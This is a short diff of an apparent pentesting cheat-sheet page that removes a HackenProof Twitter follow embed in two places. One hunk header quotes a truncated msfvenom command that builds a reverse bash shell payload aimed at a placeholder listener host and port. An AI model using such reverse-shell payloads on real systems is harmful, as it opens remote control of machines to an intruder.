@@ -27,7 +27,7 @@
 
 💬 Participate in community discussions
 
-{% embed url="https://twitter.com/intent/follow?original_referer=https%3A%2F%2Fwww.hackenproof.com%2F&screen_name=hackenproof" %}
+
 
 
 
@@ -205,7 +205,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 
 💬 Participate in community discussions
 
-{% embed url="https://twitter.com/intent/follow?original_referer=https%3A%2F%2Fwww.hackenproof.com%2F&screen_name=hackenproof" %}
+
 
 
 <details>
